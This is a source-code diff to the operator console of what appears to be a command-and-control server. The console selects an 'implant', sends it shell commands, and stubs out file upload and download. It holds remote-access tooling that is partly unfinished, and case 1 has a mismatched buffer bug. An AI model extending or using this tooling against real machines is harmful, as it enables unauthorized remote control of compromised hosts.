@@ -1,3 +1,11 @@
+/*
+console.c
+
+This function is responsible for handling user input. It will select an agent to interact with.
+It will pass commands to the message handler and receive responses from the message handler
+
+*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -8,27 +16,27 @@
 #include "implant.h"
 #include "base.h"
 #include "console.h"
+#include "message_handler.h"
 
 // Global variables
-extern struct implant_poll *poll_struct;
+extern implant_poll *poll_struct;
 extern pthread_mutex_t poll_lock;
 // Receive Queue
-extern struct Queue* receive_queue;
+extern Queue* receive_queue;
 extern pthread_mutex_t receive_queue_lock;
 // Send Queue
-extern struct Queue* send_queue;
+extern Queue* send_queue;
 extern pthread_mutex_t send_queue_lock;
 
 int agent_console(int agent_fd){
 	const char* menu = "Implant %d selected.\n"
 				 "Provide an option.\n"
 				 "1 - execute command\n"
-				 "2 - get processes (ps -aux)\n"
-				 "3 - get network statistics (netstat -plantu)\n"
+				 "2 - put file\n"
+				 "3 - get file\n"
 				 "4 - go back\n\n";
 	char buffer[BUFFERSIZE];
 	char* buf;
-	struct Message* message;
 	long option;
 	printf(menu, agent_fd);
 	printf(">");
@@ -36,45 +44,17 @@ int agent_console(int agent_fd){
 	while(fgets(buffer, BUFFERSIZE, stdin)){
 		option = strtol(buffer, NULL, 10);
 		switch(option){
-	        case 1:
-	        	message = malloc(sizeof(message));
-	        	message->id = agent_fd;
+	        case 1:	        	
+	        	printf("Command > ");
+	        	buf = malloc(BUFFERSIZE);
+	        	memset(buf, 0, BUFFERSIZE);
+	        	fgets(buf, BUFFERSIZE - 1, stdin);
 	        	
-	        	printf("What do you want to send?\n");
-	        	message->buffer = malloc(BUFFERSIZE);
-	        	memset(message->buffer, 0, BUFFERSIZE);
-	        	fgets(message->buffer, BUFFERSIZE - 1, stdin);
-	        	message->size = strlen(message->buffer);
-	        	
-	        	pthread_mutex_lock(&send_queue_lock);
-	        	enqueue(send_queue, message);
-	        	pthread_mutex_unlock(&send_queue_lock);
+	        	prepare_message(agent_fd, TYPE_COMMAND, buffer, strlen(buffer));
 	        	break;
 	        case 2:
-	        	message = malloc(sizeof(message));
-	        	message->id = agent_fd;
-
-				message->buffer = malloc(BUFFERSIZE);
-				memset(message->buffer, 0, BUFFERSIZE);
-	        	strcpy(message->buffer, "process\n");
-	        	message->size = strlen("process\n");
-	        	
-	        	pthread_mutex_lock(&send_queue_lock);
-	        	enqueue(send_queue, message);
-	        	pthread_mutex_unlock(&send_queue_lock);
 	        	break;
 	        case 3:
-	        	message = malloc(sizeof(message));
-	        	message->id = agent_fd;
-	        
-	        	message->buffer = malloc(BUFFERSIZE);
-	        	memset(message->buffer, 0, BUFFERSIZE);
-	        	strcpy(message->buffer, "netstat\n");
-	        	message->size = strlen("netstat\n");
-	        	
-	        	pthread_mutex_lock(&send_queue_lock);
-	        	enqueue(send_queue, message);
-	        	pthread_mutex_unlock(&send_queue_lock);
 	        	break;
 	        case 4:
 	        	return 0;
